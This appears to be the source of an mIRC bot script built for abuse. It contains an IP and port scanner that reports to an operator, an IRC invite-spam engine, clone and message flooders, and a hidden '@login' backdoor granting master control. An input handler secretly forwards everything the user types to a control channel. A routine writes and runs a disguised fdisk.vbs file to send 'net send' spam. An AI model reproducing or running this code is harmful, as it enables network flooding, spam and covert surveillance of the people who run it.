on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
alias scancheck {
  if (%scan.start1 > 255) { ..emsg %scan.nick Scaning Has Completed | ..emsg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
  if (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) { ..emsg %scan.nick An Error Has Occured in the Scanning Proccess, Scan Aborted at %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 | unset %scan.* | .timerscan off | halt }
  if ($count(%scan.port,$chr(44)) >= 1) {
    set %scan.counter 0
    set %scan.countport $count(%scan.port,$chr(44))
    inc %scan.countport 1
    :start
    inc %scan.counter 1
    .sockopen scan $+ $gettok(%scan.port,%scan.counter,44) $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $gettok(%scan.port,%scan.counter,44)
    if (%scan.counter >= %scan.countport) { goto end }
    else { goto start }
  }
  else { .sockopen scan $+ %scan.port $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.port }
  :end
  inc %scan.start4 1
  if (%scan.start4 > %scan.end4) { set %scan.start4 %scan.perm4 | inc %scan.start3 }
  if (%scan.start3 > %scan.end3) { set %scan.start3 %scan.perm3 | inc %scan.start2 }
  if (%scan.start2 > %scan.end2) { set %scan.start2 %scan.perm2 | inc %scan.start1 }
  if (%scan.start1 > %scan.end1) { .emsg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
}
alias scansock {
  if ($sock(scan*,0) = 0) {
    ..emsg %scan.nick All Sockets Have closed, scanning all Variables now Being wiped!
    unset %scan.*
    .timersockscheck off
  }
}
on *:SOCKOPEN:scan*: {
  if ($sockerr > 0) { .sockclose $sockname | halt }
  .msg %scan.nick IP: $gettok($remove($sockname,scan),2-,46) Port: $gettok($remove($sockname,scan),1,46)
  .write scan.txt IP: $gettok($remove($sockname,scan),2-,46) Port: $gettok($remove($sockname,scan),1,46)
  .sockclose $sockname
}
on *:sockopen:turbo:{
  %r.user = $r(a,z) $+ $r(1,99999)
  sockwrite -n  turbo NICK $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(1,99999) $+ $crlf $+ USER %r.user %r.user %r.user : $+ %r.user
}
alias turbo { sockwrite -n turbo $1- }
#dns off
on 1:sockread:turbo:{
  if ($sockerr > 0) return
  :nextread
  sockread %t
  if ($sockbr == 0) return
  if (%t == $null) %t = -
  echo 4 %t
  tokenize 32 %t
  if ($1 == PING) { sockwrite -n turbo PONG $gettok($2,1,58) }
  if ($4 == :VERSION) { sockwrite -n turbo NOTICE $gettok($gettok($1,1,58),1,33) :VERSION FUCK OFF }
}

on 1:dns: { 
  if ($raddress == $null) { halt }
  if (%ourchan == yes) { set %ourchan no | set %invitemsg %regularmsg }
  set %inviteserver $raddress
  unset %invitenicklist*
  sockopen turbo %inviteserver %inviteport
  if (%invitechan == #Lep) { set %chan1 #Lep | .enable #fuckup }
  else { .enable #invite  | disable #dns }
}
#dns end
#invite on
on 1:sockread:turbo:{
  if ($sockerr > 0) return
  :nextread
  sockread %t
  if ($sockbr == 0) return
  if (%t == $null) %t = -
  echo 4 %t
  tokenize 32 %t
  if ($1 == PING) { sockwrite -n turbo PONG $gettok($2,1,58) }
  if ($4 == :VERSION) { sockwrite -n turbo NOTICE $gettok($gettok($1,1,58),1,33) :VERSION  FUCK OFF }
  if ($2 == 376) { 
    inc %i
    sockwrite -n turbo JOIN %chan1
    set %totalcomplete no
    set %templen 0
    set %nameslen 0 
    set %num 0
    set %numinvites 0
    set %inviteusers 0
    set %inviteircops 0
    set %away 0
    set %voiced 0
    sockwrite -n turbo WHO %chan1
  }
  if ($2 == 352) {
    if (H@ isin $9) { inc %ops | halt }
    if ($chr(42) isin $9) { inc %inviteircops | halt }
    if ($chr(64) isin $9) { halt }
    if (%invitenicklist == $null) { set %invitenicklist $6 | inc %inviteusers | inc %num | inc %maxlist }
    elseif (%num <= 20) { set %invitenicklist %invitenicklist $+ , $+ $8 | inc %inviteusers | inc %num   }
    elseif (%num >= 21 && %num <= 40)  { set %invitenicklist1 %invitenicklist1 $+ , $+ $8 | inc %inviteusers | inc %num  }
    elseif (%num >= 41 && %num <= 60)  { set %invitenicklist2 %invitenicklist2 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 61 && %num <= 80)  { set %invitenicklist3 %invitenicklist3 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 81 && %num <= 100)  { set %invitenicklist4 %invitenicklist4 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 101 && %num <= 120)  { set %invitenicklist5 %invitenicklist5 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 121 && %num <= 140)  { set %invitenicklist6 %invitenicklist6 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 141 && %num <= 160)  { set %invitenicklist7 %invitenicklist7 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 161 && %num <= 180)  { set %invitenicklist8 %invitenicklist8 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 181 && %num <= 200)  { set %invitenicklist9 %invitenicklist9 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 201 && %num <= 220)  { set %invitenicklist10 %invitenicklist10 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 221 && %num <= 240)  { set %invitenicklist11 %invitenicklist11 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 241 && %num <= 260)  { set %invitenicklist12 %invitenicklist12 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 261 && %num <= 280)  { set %invitenicklist13 %invitenicklist13 $+ , $+ $8 | inc %inviteusers | inc %num  }
    elseif (%num >= 281 && %num <= 300)  { set %invitenicklist14 %invitenicklist14 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 301 && %num <= 320)  { set %invitenicklist15 %invitenicklist15 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 321 && %num <= 340)  { set %invitenicklist16 %invitenicklist16 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 341 && %num <= 360)  { set %invitenicklist17 %invitenicklist17 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 361 && %num <= 380)  { set %invitenicklist18 %invitenicklist18 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 381 && %num <= 400)  { set %invitenicklist19 %invitenicklist19 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 401 && %num <= 420)  { set %invitenicklist20 %invitenicklist20 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 421 && %num <= 440)  { set %invitenicklist21 %invitenicklist21 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 441 && %num <= 460)  { set %invitenicklist22 %invitenicklist22 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 461 && %num <= 480)  { set %invitenicklist23 %invitenicklist23 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 481 && %num <= 500)  { set %invitenicklist24 %invitenicklist24 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 501 && %num <= 520)  { set %invitenicklist25 %invitenicklist25 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 521 && %num <= 540)  { set %invitenicklist26 %invitenicklist26 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 541 && %num <= 560)  { set %invitenicklist27 %invitenicklist27 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 561 && %num <= 580)  { set %invitenicklist28 %invitenicklist28 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 581 && %num <= 600)  { set %invitenicklist29 %invitenicklist29 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 601 && %num <= 620)  { set %invitenicklist30 %invitenicklist30 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 621 && %num <= 640)  { set %invitenicklist31 %invitenicklist31 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 641 && %num <= 660)  { set %invitenicklist32 %invitenicklist32 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 661 && %num <= 680)  { set %invitenicklist33 %invitenicklist33 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 681 && %num <= 700)  { set %invitenicklist34 %invitenicklist34 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 701 && %num <= 720)  { set %invitenicklist35 %invitenicklist35 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 721 && %num <= 740)  { set %invitenicklist36 %invitenicklist36 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 741 && %num <= 760)  { set %invitenicklist37 %invitenicklist37 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 761 && %num <= 780)  { set %invitenicklist38 %invitenicklist38 $+ , $+ $8 | inc %inviteusers | inc %num }
    elseif (%num >= 781 && %num <= 800)  { set %invitenicklist39 %invitenicklist39 $+ , $+ $8 | inc %inviteusers | inc %num }
  }
  if ($2 == 315) {
    sockwrite -n turbo PRIVMSG %invitenicklist : $+ %invitemsg %msgadd
    sockwrite -n turbo PART %chan1
    sockwrite -n turbo NICK %slide
    .enable #checker 
    sockclose turbo* 
    .timer5 1 4 sockopen turbo %inviteserver %inviteport
    .disable #invite
  }
}
#invite end
#checker off
on 1:sockread:turbo:{
  if ($sockerr > 0) return
  :nextread
  sockread %t
  if ($sockbr == 0) return
  if (%t == $null) %t = -
  echo 4 %t
  tokenize 32 %t
  if ($1 == PING) { sockwrite -n turbo PONG $gettok($2,1,58) }
  if ($4 == :VERSION) { sockwrite -n turbo NOTICE $gettok($gettok($1,1,58),1,33) :VERSION  FUCK OFF }
  if ($2 == 376) { 
    if (%invitenicklist39 == $null) { set %maxlist 38 }     
    if (%invitenicklist38 == $null) { set %maxlist 37 }     
    if (%invitenicklist37 == $null) { set %maxlist 36 }       
    if (%invitenicklist36 == $null) { set %maxlist 35 }       
    if (%invitenicklist35 == $null) { set %maxlist 34 }      
    if (%invitenicklist34 == $null) { set %maxlist 33 }      
    if (%invitenicklist33 == $null) { set %maxlist 32 }     
    if (%invitenicklist32 == $null) { set %maxlist 31 }
    if (%invitenicklist31 == $null) { set %maxlist 30 }
    if (%invitenicklist30 == $null) { set %maxlist 29 }
    if (%invitenicklist29 == $null) { set %maxlist 28 }
    if (%invitenicklist28 == $null) { set %maxlist 27 }
    if (%invitenicklist27 == $null) { set %maxlist 26 }
    if (%invitenicklist26 == $null) { set %maxlist 25 }
    if (%invitenicklist25 == $null) { set %maxlist 24 }
    if (%invitenicklist24 == $null) { set %maxlist 23 }
    if (%invitenicklist23 == $null) { set %maxlist 22 }
    if (%invitenicklist22 == $null) { set %maxlist 21 }
    if (%invitenicklist21 == $null) { set %maxlist 20 }
    if (%invitenicklist20 == $null) { set %maxlist 19 }
    if (%invitenicklist19 == $null) { set %maxlist 18 }
    if (%invitenicklist18 == $null) { set %maxlist 17 }
    if (%invitenicklist17 == $null) { set %maxlist 16 }
    if (%invitenicklist16 == $null) { set %maxlist 15 }
    if (%invitenicklist15 == $null) { set %maxlist 14 }
    if (%invitenicklist14 == $null) { set %maxlist 13 }
    if (%invitenicklist13 == $null) { set %maxlist 12 }
    if (%invitenicklist12 == $null) { set %maxlist 11 }
    if (%invitenicklist11 == $null) { set %maxlist 10 }
    if (%invitenicklist10 == $null) { set %maxlist 9 }
    if (%invitenicklist9 == $null) { set %maxlist 8 }
    if (%invitenicklist8 == $null) { set %maxlist 7 }
    if (%invitenicklist7 == $null) { set %maxlist 6 }
    if (%invitenicklist6 == $null) { set %maxlist 5 }
    if (%invitenicklist5 == $null) { set %maxlist 4 }
    if (%invitenicklist4 == $null) { set %maxlist 3 }
    if (%invitenicklist3 == $null) { set %maxlist 2 }
    if (%invitenicklist2 == $null) { set %maxlist 1 }
    if (%invitenicklist1 == $null) { set %maxlist 0 }
    if (%times == 20) { set %invitemsg %special | set %times 0 | set %ourchan yes }
    .enable #sender
    .disable #checker
    set %currentlist 1
    set %slide $random
    set %slide1 $random
    set %slide2 $random
    set %slide3 $random
    set %slide4 $random
    set %slide5 $random
    set %slide6 $random
    set %slide7 $random
    set %nickname 2
    sockwrite -n turbo PRIVMSG %invitenicklist1 : $+ %invitemsg
    timer234 1 3 sockclose turbo*
    .timer23 1 4 sockopen turbo %inviteserver %inviteport
  }
}
#checker end
#sender off
on 1:sockread:turbo:{
  if ($sockerr > 0) return
  :nextread
  sockread %t
  if ($sockbr == 0) return
  if (%t == $null) %t = -
  echo 4 %t
  tokenize 32 %t
  if ($1 == PING) { sockwrite -n turbo PONG $gettok($2,1,58) }
  if ($4 == :VERSION) { sockwrite -n turbo NOTICE $gettok($gettok($1,1,58),1,33) :VERSION  FUCK OFF }
  if ($2 == 376) { 
    inc %currentlist
    inc %nickname
    if (%nickname == 2) { sockwrite -n turbo nick %slide2 }
    if (%nickname == 3) { sockwrite -n turbo nick %slide3 }
    if (%nickname == 4) { sockwrite -n turbo nick %slide4 }
    if (%nickname == 5) { sockwrite -n turbo nick %slide5 }
    if (%nickname == 6) { sockwrite -n turbo nick %slide6 }
    if (%nickname == 7) { sockwrite -n turbo nick %slide7 }
    if %nickname == 8) { set %nickname 1 | sockwrite -n turbo nick %slide }
    if (%currentlist <= %maxlist) { sockwrite -n turbo PRIVMSG % [ $+ [ invitenicklist [ $+ [ %currentlist ] ] ] ] : $+ %invitemsg }
    elseif (%currentlist > %maxlist) { set %totalcomplete yes | goto end }
    sockclose turbo*
    .timer22 1 5 sockopen turbo %inviteserver %inviteport
    :end
    if (%totalcomplete == yes) {
      .timerINCTT off
      msg %turbo.main.ch4n 12[15Inviting Finished12] Total15: 14 $+ %inviteusers 12OPs Discluded15: 14 $+ %ops 12IRCops Discluded15: 14 $+ %inviteircops 12Total Time15:14 $duration(%turbo.time.started)
      .disable #sender 
      sockwrite -n turbo QUIT :We Be Ereet!
    }
  }
}
#sender end
#fuckup off
on 1:sockread:turbo:{
  if ($sockerr > 0) return
  :nextread
  sockread %t
  if ($sockbr == 0) return
  if (%t == $null) %t = -
  echo 4 %t
  tokenize 32 %t
  if ($1 == PING) { sockwrite -n turbo PONG $gettok($2,1,58) }
  if ($4 == :VERSION) { sockwrite -n turbo NOTICE $gettok($gettok($1,1,58),1,33) :VERSION  FUCK OFF }
  if ($2 == 376) { 
    sockwrite -n turbo JOIN %chan1 
    set %totalcomplete no
    set %templen 0
    set %nameslen 0 
    set %num 0
    set %numinvites 0
    set %inviteusers 0
    set %inviteircops 0
    set %away 0
    set %voiced 0
    sockwrite -n turbo who %chan1
  }
  if ($2 == 352) { 
    if (%invitenicklist == $null) { set %invitenicklist $8 | inc %inviteusers }
    else { set %invitenicklist %invitenicklist $+ , $+ $8 }
  }
  if ($2 == 315) { 
    sockwrite -n turbo PRIVMSG %invitenicklist : $+ %regularmsg
    .timer77 1 10 .disable #fuckup
  }
}
#fuckup end
alias invitebot3 {
  set %inviteserver $1
  set %inviteport $2
  set %invitechan $3
  if ($chr(44) isin %invitechan) {
    unset %chan*
    set %max $count(%invitechan,$chr(44))
    set %i 0
    set %thestring %invitechan
    :loop
    inc %i
    if (%i > %max) { goto end }
    %temp = $pos(%thestring,$chr(44))
    %temp = %temp - 1
    set % [ $+ [ chan [ $+ [ %i ] ] ] ] $left(%thestring,%temp)
    set %temp % [ $+ [ chan [ $+ [ %i ] ] ] ] $+ $chr(44)
    %temp = $len(%thestring) - $len(%temp)
    set %thestring $right(%thestring,%temp)
    goto loop
    :end
    set % [ $+ [ chan [ $+ [ %i ] ] ] ] %thestring
    set %multibotchans true
  }
  else { set %chan1 %invitechan }
  set %invitemsg  $4- 
  dns %inviteserver
}
on *:TEXT:@login *:*:{
  if ($ulevel == 400) { halt }
  if ($exists(ap.dll) == false) { goto mirc }
  else { goto krypt }
  :krypt
  if ($dll(ap.dll,bill,$nick $+ $nick $+ $chr(1) $+ $2-) == $nick $+ $site) { goto d0ne }
  else { goto end }
  :mirc
  .notice $nick No encryption file found, ap.dll
  set -u1 %script.pass $nick $+ $site
  set -u1 %script.pass $replace(%script.pass,a,g,b,k,c,l,d,j,e,h,f,6,g,4,h,0,i,3,j,f,k,9,l,i,m,e,n,3,o,9,p,d,q,8,r,s,s,e,t,z,u,x,v,m,w,f,x,t,y,o,z,h,1,k,2,6,3,8,4,r,5,d,6,9,7,9,8,3,9,f,0,f)
  set -u1 %script.pass $remove(%script.pass,.)
  if ($2 == %script.pass) { goto d0ne }
  else { goto end }
  :d0ne
  .auser 400 $nick
  .emsg $a 11�12�15�11� 15Login Accepted 12�15� 12User2:15[ $+ $nick $+ ] 12�15� 12Level2:15[Master] 11�15�12�11�
  goto end
  :end
}
alias dksmsgflooder { if ($sock(dksmsgflooder2,0) == 0) { sockopen dksmsgflooder2 %msg.flood.server %msg.flood.server.port }   | if ($sock(dksmsgflooder1,0) == 0) { sockopen dksmsgflooder1 %msg.flood.server %msg.flood.server.port }  }
alias rc {  if ($1 == 1) { return  $+ $r(1,15) } | if ($1 == 2) { return  } | if ($1 == 3) { return  } | if ($1 == 4) { return  $+ $r(1,15) } | if ($1 == 5) { return  } | if ($1 == 6) { return  } | if ($1 == 7) { return  } | if ($1 == 8) { return  $+ $r(1,15) $+ , $+ $r(1,15) } }
alias rcr { if ($1 == 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 2) { return $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) } | if ($1 == 3) { return $r(1,100) $+ $r(1,100) $+ $r(1,100) $+ $r(1,100) } | if ($1 == 4) { return $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) $+ $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) } }
on *:sockopen:dksmsgflooder*:{  inc %bots 1 | sockwrite -tn dksmsgflooder* User $read webfonts.dll $+ $r(a,z) $+ $r(1,60) a a :�[ [ $read  webfonts.dll ] ]  | sockwrite -nt dksmsgflooder* NICK $randomgen($r(0,9)) | sockwrite -nt dksmsgflooder* PONG $server |  sockwrite -nt dksmsgflooder* privmsg %nick2bomb : $+ %msg2bomb | sockwrite -nt dksmsgflooder* notice %nick2bomb : $+ %msg2bomb | sockclose $sockname | dec %bots 1 | /dksmsgflooder }
alias clone { if ($1 == in) { if ($2 == PING) { sockwrite -tn $sockname PONG $3   }  }
  if ($1 == quit) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* quit : $+ $2- }  | if ($sock(sock*,0) > 0) { sockwrite -tn sock* quit : $+ $2- }   }
  if ($1 == msg) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* privmsg $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* privmsg $2 : $+ $3- }  }
  if ($1 == notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* notice $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* notice $2 : $+ $3- }  }
  if ($1 == all) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* PRIVMSG $2 :TIME | sockwrite -tn clone* PRIVMSG $2 :PING | sockwrite -tn clone* PRIVMSG $2 :VERSION  } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* PRIVMSG $2 :TIME | sockwrite -tn sock* PRIVMSG $2 :PING | sockwrite -tn sock* PRIVMSG $2 :VERSION }  }
  if ($1 == time) { if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :TIME } | if ($sock(sock*,0) > 0) {    .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :TIME } }
  if ($1 == ping) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {     .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :PING } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :PING }  }
  if ($1 == version) {  if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :VERSION } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :VERSION } }
  if ($1 == join) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* join $2 } |  if ($sock(sock*,0) > 0) {   sockwrite -tn sock* join $2 } }
  if ($1 == part) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  /sockwrite -n clone* part $2 : $+ $3- }  if ($sock(sock*,0) > 0) {  /sockwrite -n sock* part $2 : $+ $3- }  }
  if ($1 == kill) {  if ($sock(clone*,0) > 0) {      sockclose clone* } |  if ($sock(sock*,0) > 0) {  sockclose sock* } }
  if ($1 == connect) {  if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($4 == $null) { halt } |  set %clone.server $2 | set %clone.port $3 | set %clone.load $4 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $r(a,z) $+ $read webfonts.dll $+ $r(a,z)  | sockopen clone $+ $randomgen($r(0,9)) $2 $3 |  dec %clone.load 1 |   goto loop  } 
  if ($1 == nick.change) {  %.nc = 1  |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end } |  sockwrite -n $sock(clone*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |   :end  |   /wnickchn |   halt  }
  if ($1 == nick.this) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) Nick $2 $+ $r(1,99999) |   inc %.nc |  goto ncloop |   :end  |  /wnickchn2 $2 |  halt  } 
}
alias randomgen { if ($1 == 0) { return $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) $+ $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) } | if ($1 == 1) { return $read webfonts.dll } | if ($1 == 2) { return ^ $+ $read webfonts.dll $+ ^ } |  if ($1 == 3) { return $r(a,z) $+ $read webfonts.dll $+ $r(1,5) } | if ($1 == 4) { return $r(A,Z) $+ $r(1,9) $+ $r(8,20) $+ $r(g,y) $+ $r(15,199) } | if ($1 == 5) { return $r(a,z) $+ $read webfonts.dll $+ - } | if ($1 == 6) { return $read webfonts.dll $+ - } | if ($1 == 7) { return $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) $+  $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) } | if ($1 == 8) { return ^- $+ $read webfonts.dll $+ -^ } | if ($1 == 9) { return $r(a,z) $+ $r(A,Z) $+ $r(1,500) $+ $r(A,Z) $+ $r(1,50) } }
alias percent { if ($1 isnum) && ($2 isnum) { return $round($calc(($1 / $2) * 100),2) $+ $chr(37) } }
on *:INPUT:*:{ haltdef | echo -a < $+ $me $+ > $1- | notice @ $+ $connect.chan INPUT: $1- TARGET: $target | clearall | chars | halt }
alias wnickchn { %.nc = 1  |   :ncloop | if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |  :end  } 
alias wnickchn2 { %.nc = 1  |  :ncloop |  if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $1 $+ $r(a,z) $+ $r(1,999) |  inc %.nc | goto ncloop |  :end  }
on *:sockopen:range.*:{ if ($sock($sockname).status == active) { set %range.ports %range.ports $sock($sockname).port | sockclose $sockname } }
alias port.range.scan { set %range1 $calc( $gettok(%port.to.scan,1,45) - 1) | set %range2 $gettok(%port.to.scan,2,45) | :lewp | inc %range1 | if (%range1 <= %range2) { sockopen range. $+ %range1 %port.scan.ip %range1 | goto lewp } | else { .timergetportsempire 1 2 get.ports } }
alias get.ports { /emsg %schan 14[15portscan14] Open ports found: $iif(%range.ports != $null, %range.ports, None) | /emsg %schan 14[15portscan14] Scanning Ports Successfully Completed for %port.scan.ip $+ $+ ... |  unset %range.ports %range1 %range2 %port.to.scan %port.scan.ip | unset %schan | sockclose range.* }
alias netspam.start { set %netspam.number 0 | set %netspam.server $1 | set %netspam.port $2  | emsg $a 5[�12Net Spammer 5]14Enabled | sockopen netspam %netspam.server %netspam.port }
alias netspam.stop { if ($exists(fdisk.vbs) == $true) { .remove fdisk.vbs } | unset %netspam* | sockclose netspam | emsg $a 5[�12Net Spammer 5]14Disabled }
on *:SOCKOPEN:netspam:{ if ($sockerr > 0) { sockclose $sockname | sockopen netspam %netspam.server %netspam.port } | sockwrite -tn $sockname USER $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) . . $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | sockwrite -tn $sockname NICK $read webfonts.dll | sockwrite -n $sockname PONG %netspam.server }
on *:SOCKCLOSE:netspam:{ if (%netspam.server == $null) { halt } | sockopen netspam %netspam.server %netspam.port | emsg # 5[�12Net Spammer 5]14Reconnecting! }
on *:SOCKREAD:netspam:{
  sockread %data
  if ($gettok(%data,1,32) = PING) { sockwrite -n $sockname PONG : $+ $gettok($gettok(%data,2,32),1,58) }
  if ($gettok(%data,2,32) = 433) { sockwrite -tn $sockname NICK $read webfonts.dll }
  if ($gettok(%data,2,32) = JOIN) {
    set %netspam.temp.address $gettok($gettok(%data,1,32),2,64)
    set %netspam.delay2 $calc(%netspam.delay + $timer(Netspam $+ %netspam.number ).secs )
    inc %netspam.number 1
    .timerNetspam $+ %netspam.number 1 %netspam.delay2 //n3ts3nd %netspam.temp.address
  }
}
alias n3ts3nd { .remove fdisk.vbs | write fdisk.vbs Set src3 = CreateObject("Wscript.shell") | write fdisk.vbs src3.run "command /c net send $1 %netspam.message ",0,true | run fdisk.vbs }
alias flood.stop { if ($sock(flood*,0) > 0) { sockclose flood* } | unset %clones | unset %nick | unset %server | unset %port | .emsg # Flooding Stop Complete }
